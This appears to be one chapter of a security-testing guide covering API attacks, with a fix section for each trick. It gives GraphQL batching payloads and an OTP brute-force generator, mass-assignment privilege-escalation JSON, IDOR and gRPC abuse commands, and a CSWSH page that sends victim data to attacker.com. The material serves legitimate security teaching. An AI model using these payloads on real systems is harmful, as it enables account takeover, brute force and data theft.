# 🔌 API & Modern Stacks (Tricks #40–#45)

> ⚠️ **Disclaimer:** Educational use only. Only test in-scope assets you are
> authorized to test. Never touch systems without explicit written permission.

Modern apps are APIs first. GraphQL, REST, WebSockets, and gRPC each have
their own bug classes — and most scanners miss them entirely because they
need **schema awareness** and **contextual testing**. These tricks cover the
highest-impact API bugs.

---

## Table of Contents

1. [GraphQL Introspection + Batching Attacks](#trick-40)
2. [GraphQL Field Duplication for Rate-Limit Bypass](#trick-41)
3. [Mass Assignment via Hidden API Fields](#trick-42)
4. [BOLA/IDOR in REST APIs via UUID Enumeration](#trick-43)
5. [WebSocket Origin Bypass + CSWSH](#trick-44)
6. [gRPC Reflection for API Discovery](#trick-45)

---

<a name="trick-40"></a>
## 🧩 Trick #40 — GraphQL Introspection + Batching Attacks

**Category:** API
**Impact:** High
**Tools:** `InQL`, `graphql-cop`, `clairvoyance`, Burp

### The Idea
GraphQL APIs often leave **introspection** enabled in production, which
exposes the entire schema. Even when disabled, you can brute-force field
names. And most GraphQL servers allow **batching** — many operations in one
request — which bypasses rate limits.

### Step 1 — Introspection

**Query:**
```graphql
query {
  __schema {
    types {
      name
      fields {
        name
        type { name kind ofType { name kind } }
      }
    }
  }
}
```

**Simplified dump:**
```graphql
{__schema{types{name,fields{name}}}}
```

**Tools:**
```bash
python3 -m pip install graphql-cop
graphql-cop -t https://target.com/graphql
```

### Step 2 — If Introspection Is Disabled

Use `clairvoyance` to brute-force field names:
```bash
clairvoyance https://target.com/graphql -o schema.json -w wordlist.txt
```

Or use error messages:
```graphql
{ user { unknownField } }
# → "Did you mean 'email', 'username', 'role'?"
```

### Step 3 — Batching Attack

**Alias-based batching:**
```graphql
mutation {
  a: login(user: "admin", pass: "123") { token }
  b: login(user: "admin", pass: "456") { token }
  c: login(user: "admin", pass: "789") { token }
  # ... up to 100+
}
```

**Array-based batching (some servers):**
```json
[
  {"query": "mutation { login(user:\"admin\",pass:\"123\") { token } }"},
  {"query": "mutation { login(user:\"admin\",pass:\"456\") { token } }"}
]
```

### Step 4 — Enumerate Sensitive Operations

Look for:
- `adminQuery`, `internalUsers`, `debugInfo`
- `deleteUser`, `setRole`, `impersonate`
- `exportData`, `dumpDatabase`
- Legacy/deprecated fields (often unguarded)

### Steps

1. **Fingerprint GraphQL:**
   ```
   POST /graphql
   {"query":"{__typename}"}
   ```

2. **Run introspection** — dump the schema.

3. **Look for high-value queries/mutations.**

4. **Test batching** for auth bypass or brute force.

5. **Test field-level auth** — some fields are unprotected.

### Why It Works
- Introspection is on by default in most GraphQL servers.
- Batching isn't rate-limited.
- Field-level authorization is often missing.

### Fix
- **Disable introspection** in production.
- Enforce **query cost / depth limits**.
- Rate limit **per operation**, not per request.
- Implement **field-level authorization**.
- Disable array batching.

### References
- [PortSwigger: GraphQL](https://portswigger.net/web-security/graphql)

---

<a name="trick-41"></a>
## 🧩 Trick #41 — GraphQL Field Duplication for Rate-Limit Bypass

**Category:** API
**Impact:** High
**Tools:** Burp, `graphql-cop`

### The Idea
Rate limiters often count **HTTP requests**, not **GraphQL operations**. A
single GraphQL request can contain 100+ aliased fields — each one a separate
operation. This bypasses OTP brute force, password reset limits, and coupon
enumeration.

### Payload

```graphql
mutation {
  a1: verifyOtp(code: "000000") { success }
  a2: verifyOtp(code: "000001") { success }
  a3: verifyOtp(code: "000002") { success }
  # ... up to a100
}
```

Or generate programmatically:
```python
aliases = "\n".join(
    f'  a{i}: verifyOtp(code: "{i:06d}") {{ success }}'
    for i in range(100)
)
query = f"mutation {{\n{aliases}\n}}"
```

### Attack Scenarios

**1. OTP brute force:**
- 6-digit OTP = 1,000,000 combos
- 100 per request → 10,000 requests
- With 10 parallel connections → minutes

**2. Password reset token brute force:**
- Short numeric tokens

**3. Coupon code enumeration:**
```graphql
query {
  c1: checkCoupon(code: "SAVE10") { discount }
  c2: checkCoupon(code: "SAVE11") { discount }
  # ...
}
```

**4. User enumeration:**
```graphql
query {
  u1: user(email: "a@x.com") { exists }
  u2: user(email: "b@x.com") { exists }
}
```

### Steps

1. **Identify an operation with a brute-forceable input.**

2. **Batch 50–100 aliased operations** into one request.

3. **Send parallel requests** (10 connections → 1000 attempts/request).

4. **Watch for the success case.**

### Why It Works
- Rate limiters see one HTTP request.
- GraphQL executes every alias.
- No limit on aliases per query.

### Fix
- **Limit aliases per query.**
- **Count operations**, not requests.
- **Add query cost analysis** (each alias = N cost).
- **Rate limit per operation type** (e.g., OTP verify).
- **Add exponential backoff** for failed attempts.

---

<a name="trick-42"></a>
## 🧩 Trick #42 — Mass Assignment via Hidden API Fields

**Category:** API
**Impact:** Critical (privilege escalation)
**Tools:** Burp, `Arjun`, `Param Miner`

### The Idea
Frameworks like Rails, Laravel, Spring, and Django auto-bind request fields
to model attributes. If the developer doesn't explicitly whitelist fields,
you can set **any** attribute — including `is_admin`, `role`, `verified`.

### Attack Payloads

**Basic escalation:**
```json
{
  "username": "attacker",
  "password": "pass123",
  "email": "attacker@evil.com",
  "is_admin": true
}
```

**Role change:**
```json
{
  "email": "new@email.com",
  "role": "admin"
}
```

**Email verification bypass:**
```json
{
  "email": "attacker@evil.com",
  "email_verified": true
}
```

**Balance manipulation:**
```json
{
  "name": "attacker",
  "balance": 999999
}
```

**ID manipulation:**
```json
{
  "user_id": 1,
  "role": "admin"
}
```

### Hidden Field Discovery

**1. Look at GET responses:**
```bash
curl -s https://target.com/api/users/me | jq keys
# → ["id","email","role","is_admin","verified","credits"]
```

**2. Compare fields across endpoints:**
- `/api/users/me` (GET)
- `/api/users/me` (PATCH)
- `/api/admin/users` (GET)

**3. Fuzz field names with Arjun:**
```bash
arjun -u https://target.com/api/users/me -m JSON --headers "Authorization: Bearer X"
```

**4. Check the source:**
- GraphQL schema
- OpenAPI / Swagger spec
- JS bundles

### Steps

1. **Enumerate your user object** (GET endpoints).

2. **Find privileged attributes** (`role`, `is_admin`, `verified`).

3. **Send them in an update request:**
   ```bash
   curl -X PATCH https://target.com/api/users/me \
     -H "Authorization: Bearer X" \
     -d '{"role":"admin"}'
   ```

4. **Verify by checking your role.**

5. **Escalate:** access admin endpoints, delete users, extract data.

### Why It Works
- Frameworks auto-bind fields to model attributes.
- No explicit whitelist (`permit`, `fillable`, `@JsonIgnore` missing).
- Clients assume they can't set privileged fields.

### Fix
- **Explicit allowlist** for writable fields (`permit(:email, :name)`).
- Use DTOs (Data Transfer Objects) instead of binding to models.
- Reject unknown fields (strict schema).
- Never trust client-supplied `role`, `is_admin`, `verified`.
- Server-side authorization checks on every sensitive attribute.

### References
- [OWASP: Mass Assignment](https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html)

---

<a name="trick-43"></a>
## 🧩 Trick #43 — BOLA/IDOR in REST APIs via UUID Enumeration

**Category:** API
**Impact:** Critical (data exposure)
**Tools:** Burp, `Autorize`, `ffuf`

### The Idea
**BOLA** (Broken Object Level Authorization) = IDOR in APIs. If an endpoint
returns an object by ID without checking ownership, you can read/modify any
user's data. Even UUIDs leak via other endpoints (list, export, share).

### Attack Patterns

**1. Sequential IDs:**
```
GET /api/orders/1001
GET /api/orders/1002
GET /api/orders/1003
```

**2. UUID enumeration via other endpoints:**
- `/api/orders` (list) → contains UUIDs
- `/api/users/{id}/orders` → leaks order UUIDs
- `/api/share/{token}` → predictable tokens
- Email notifications → include UUIDs

**3. GraphQL BOLA:**
```graphql
query {
  order(id: "123e4567-e89b-12d3-a456-426614174000") {
    id total items { name }
  }
}
```

**4. Batching BOLA:**
```graphql
query {
  a: order(id: "uuid1") { total }
  b: order(id: "uuid2") { total }
  c: order(id: "uuid3") { total }
}
```

**5. HTTP method swap:**
```
GET /api/orders/123     # 403
POST /api/orders/123    # maybe 200?
PUT /api/orders/123     # maybe 200?
DELETE /api/orders/123  # maybe 200?
PATCH /api/orders/123   # maybe 200?
```

**6. Version bypass:**
```
GET /api/v1/orders/123   # 403 (patched)
GET /api/v2/orders/123   # 200 (unpatched!)
GET /api/internal/orders/123
```

**7. Nested IDOR:**
```
GET /api/users/me/orders/999
# "me" is checked, but order 999 belongs to someone else
```

**8. Parameter pollution:**
```
GET /api/orders/123?order_id=999
GET /api/orders/123&id=999
```

### Steps (Manual)

1. **Create two accounts** (attacker + victim).

2. **As attacker, request victim's object** by ID.

3. **If 200 → BOLA confirmed.**

### Steps (Automated with Autorize)

1. **Install Autorize** in Burp.

2. **Configure with attacker's low-priv cookie.**

3. **Browse as victim.**

4. **Autorize replays each request as attacker** — flags any 200 responses.

### Steps (UUID Guessing)

1. **Find UUIDs** via:
   - List endpoints
   - Emails
   - Share links
   - Analytics
   - JS bundles

2. **Try neighboring UUIDs** — v1 UUIDs are time-based → predictable.

3. **Try v4 UUIDs** — 122 random bits, but if leaked elsewhere, still
   exploitable.

### Why It Works
- Backend checks "is logged in" but not "owns this object".
- UUIDs are assumed unguessable → used as authorization.
- Versioned APIs may have inconsistent auth.

### Fix
- **Check ownership on every request:**
  ```python
  if order.user_id != current_user.id:
      return 403
  ```
- Use **opaque, per-user IDs**.
- Never rely on UUID unguessability.
- Enforce authorization at the **data layer**.
- Use BOLA detection in CI/CD.

### References
- [OWASP API Security Top 10: API1 BOLA](https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/)

---

<a name="trick-44"></a>
## 🧩 Trick #44 — WebSocket Origin Bypass + CSWSH

**Category:** API
**Impact:** High (session hijacking)
**Tools:** Burp, browser DevTools

### The Idea
**CSWSH** (Cross-Site WebSocket Hijacking) happens when the WebSocket
handshake doesn't validate the `Origin` header and relies only on cookies for
auth. A malicious page opens a WebSocket to the target — the browser sends
the victim's cookies — and the attacker reads/writes on the victim's behalf.

### Vulnerable Handshake

```
GET /ws HTTP/1.1
Host: target.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: xyz
Sec-WebSocket-Version: 13
Cookie: session=VICTIM_SESSION
# Missing: no Origin check
```

### Attacker Page

```html
<script>
  const ws = new WebSocket('wss://target.com/ws');
  ws.onopen = () => {
    ws.send(JSON.stringify({action: 'getProfile'}));
  };
  ws.onmessage = (e) => {
    fetch('https://attacker.com/log', {
      method: 'POST',
      body: e.data
    });
  };
</script>
```

Victim visits attacker page → WebSocket opens with victim's cookie →
attacker receives victim's data → exfiltrates.

### Testing Steps

1. **Capture the WebSocket handshake** in Burp.

2. **Remove or modify the `Origin` header:**
   - Change to `https://attacker.com`
   - Remove entirely

3. **If the server accepts** → CSWSH likely.

4. **Test message flow:**
   - Send `{"action":"getProfile"}` from a foreign origin.
   - Does the server respond with victim data?

5. **Build PoC page** hosting the WebSocket client, have a test victim visit.

6. **Document impact:**
   - Read messages
   - Send messages as victim
   - Extract tokens

### Advanced

**1. Origin `null`:**
```
Origin: null
```
Sandboxed iframes send `null` — server may accept.

**2. Subdomain bypass:**
```
Origin: https://evil.target.com
```
If validation is `endsWith('.target.com')`, attacker registers
`evil.target.com` via subdomain takeover.

**3. Case manipulation:**
```
Origin: HTTPS://TARGET.COM
Origin: https://TARGET.com
```

**4. Trailing slash / port:**
```
Origin: https://target.com:443
Origin: https://target.com/
Origin: https://target.com.
```

### Why It Works
- Browsers send cookies with WebSocket handshakes (no SOP).
- Server doesn't validate `Origin`.
- Only cookie auth is checked.

### Fix
- **Validate `Origin` header** against an exact allowlist.
- Use **CSRF tokens** in the WebSocket handshake (query param or subprotocol).
- Use **`Sec-WebSocket-Protocol`** for auth tokens, not cookies.
- Never trust `Origin: null`.
- Reject missing `Origin` header.

### References
- [PortSwigger: Cross-site WebSocket hijacking](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking)

---

<a name="trick-45"></a>
## 🧩 Trick #45 — gRPC Reflection for API Discovery

**Category:** API
**Impact:** Medium
**Tools:** `grpcurl`, `grpcui`, `ghz`

### The Idea
gRPC servers often leave **reflection** enabled — an API that exposes the
server's method list and message schemas. This is the gRPC equivalent of
GraphQL introspection. Even without reflection, you can discover methods
from `.proto` files leaked in client apps or repos.

### Step 1 — Check for Reflection

```bash
grpcurl -plaintext target.com:443 list
```

If it returns a list of services, reflection is on:
```
grpc.health.v1.Health
grpc.reflection.v1alpha.ServerReflection
target.UserService
target.AdminService
```

### Step 2 — Describe a Service

```bash
grpcurl -plaintext target.com:443 describe target.UserService
```

Output:
```
service UserService {
  rpc GetUser ( .target.GetUserRequest ) returns ( .target.User );
  rpc UpdateUser ( .target.UpdateUserRequest ) returns ( .target.User );
  rpc DeleteUser ( .target.DeleteUserRequest ) returns ( .target.Empty );
}
```

### Step 3 — Describe a Message

```bash
grpcurl -plaintext target.com:443 describe target.UpdateUserRequest
```

Output:
```
message UpdateUserRequest {
  string user_id = 1;
  string email = 2;
  string role = 3;       # ← mass assignment candidate!
  bool is_admin = 4;     # ← jackpot
}
```

### Step 4 — Call Methods

```bash
grpcurl -plaintext -d '{"user_id":"123"}' target.com:443 target.UserService.GetUser
```

**Mass assignment test:**
```bash
grpcurl -plaintext -d '{"user_id":"me","is_admin":true}' \
  target.com:443 target.UserService.UpdateUser
```

**BOLA test:**
```bash
grpcurl -plaintext -d '{"user_id":"victim_id"}' \
  target.com:443 target.UserService.GetUser
```

### Step 5 — If Reflection Is Off

**1. Find `.proto` files:**
- Client apps (mobile, desktop)
- GitHub repos
- NPM / Maven packages
- JS bundles

**2. Use the `.proto` to call:**
```bash
grpcurl -plaintext -proto service.proto -d '{}' target.com:443 target.UserService.GetUser
```

**3. Brute-force method names:**
```bash
grpcurl -plaintext -d '{}' target.com:443 target.UserService.GetUser
grpcurl -plaintext -d '{}' target.com:443 target.UserService.Admin
grpcurl -plaintext -d '{}' target.com:443 target.UserService.Internal
```

### gRPC-Specific Attacks

**1. Mass assignment** (via proto fields) — same as REST.

**2. BOLA** — same as REST.

**3. Reflection + unauthenticated access** — often reflection endpoints
bypass auth.

**4. Method fuzzing** — try internal method names.

**5. Metadata injection:**
```bash
grpcurl -plaintext -H 'authorization: Bearer X' -H 'x-user-id: 1' ...
```

### Why It Works
- Reflection is enabled by default in many frameworks.
- Proto files define all fields — including sensitive ones.
- gRPC is often treated as "internal" and left unauthenticated.

### Fix
- **Disable reflection** in production.
- **Authenticate every RPC** — even "internal" ones.
- **Enforce field-level authorization** on messages.
- **Use strict field allowlists** for updates.
- **Never expose gRPC directly to the internet** — use a gateway.

### References
- [grpcurl](https://github.com/fullstorydev/grpcurl)
- [grpcui](https://github.com/fullstorydev/grpcui)

---

## 📌 Quick Reference Summary

| #  | Trick                          | Impact   | Effort |
|----|--------------------------------|----------|--------|
| 40 | GraphQL introspection + batch  | High     | Low    |
| 41 | GraphQL alias rate bypass      | High     | Low    |
| 42 | Mass assignment                | Critical | Low    |
| 43 | BOLA / IDOR                    | Critical | Low    |
| 44 | CSWSH                          | High     | Low    |
| 45 | gRPC reflection                | Medium   | Low    |

---

> **Prev:** [Cache & Infrastructure ←](07-cache-infra.md)
> **Next:** [Mobile →](09-mobile.md)
